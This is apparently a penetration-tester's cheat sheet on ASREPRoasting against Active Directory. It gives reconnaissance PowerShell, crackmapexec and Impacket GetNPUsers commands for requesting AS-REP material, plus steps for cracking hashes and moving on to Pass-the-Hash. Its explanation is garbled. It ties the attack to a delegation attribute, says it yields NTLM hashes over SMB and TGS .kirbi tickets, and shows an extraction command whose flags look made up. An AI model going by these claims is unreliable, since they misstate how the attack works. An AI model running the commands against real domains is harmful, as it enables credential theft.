# 🛰️ ASREPRoasting

> [!ABSTRACT] Overview of ASREPRoasting Attack
>
> ASREPRoasting is a method used to extract NTLM hashes from Active Directory users over SMB (Server Message Block) protocol when the `msDS-AllowedToActOnBehalfOfOtherIdentity` property is improperly configured. This attack exploits the ability of machines and services to authenticate to one another without needing to validate credentials against an LDAP domain controller.

---

## 🌐 ASREPRoasting Exploit Workflow

### Prerequisites
> [!NOTE] Necessary Conditions for ASREPRoasting
>
> - The target user must have `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute set to another computer or service account.
> - Kerberos Constrained Delegation (KCD) is not properly configured.

### Initial Reconnaissance

#### Check User Attributes

```bash
Get-ADUser -Filter 'msDS-AllowedToActOnBehalfOfOtherIdentity -like "*"' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity, name | ft Name, msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Identify Vulnerable Users

```bash
Get-ADUser -Filter 'msDS-AllowedToActOnBehalfOfOtherIdentity -like "*"' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity, name | ft Name, msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## 🛠 Exploitation

### Generate ASREP Tickets for the Target User

```bash
crackmapexec smb <IP> -u user -d domain --asreproast
```

#### Use Impacket `GetNPUsers` Script

```bash
GetNPUsers.py domain.local/username:password -request -outputfile asrepdump.txt -no-pass
```

### Collect ASREP Tickets for Offline Hash Extraction

Once the ASREPRoasting is successful, you will have obtained ticket-granting service (TGS) tickets in `.kirbi` format.

---

## 🚀 Post-Exploitation Steps

#### Extract NTLM Hash from .kirbi File

```bash
extract.py -f asrepdump.txt.kirbi -vip <IP> --username user --ntdirlmhash | grep 'user' | cut -d: -f2 | tr -d '\r'
```

#### Cracking the NTLM Hash (Optional)

If you have a captured NTLM hash, use tools like `Hashcat` or `John the Ripper` to crack it.

> [!WARNING] Be cautious with cracking as this may leave traces of activity that could trigger alerts in your environment.

---

## 📄 Important Notes

- Ensure Kerberos settings are correctly configured to prevent ASREPRoasting.
- Review all user and service account permissions regularly for improper configurations.

> [!EXAMPLE]
>
> ```text
> Get-ADUser -Filter 'msDS-AllowedToActOnBehalfOfOtherIdentity -like "*"' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity, name | ft Name, msDS-AllowedToActOnBehalfOfOtherIdentity
> ```

---

## 🧠 Mental Model

```text
ASREPRoasting Rule of Thumb:
1. Identify users with improper `msDS-AllowedToActOnBehalfOfOtherIdentity` attributes.
2. Use crackmapexec or GetNPUsers.py to request ASREP tickets.
3. Extract NTLM hashes from the captured tickets for offline cracking.
```

> [!SUCCESS] Successful ASREPRoasting
>
> ```text
> Once you obtain and extract an NTLM hash, further attacks like Pass-the-Hash become possible.
```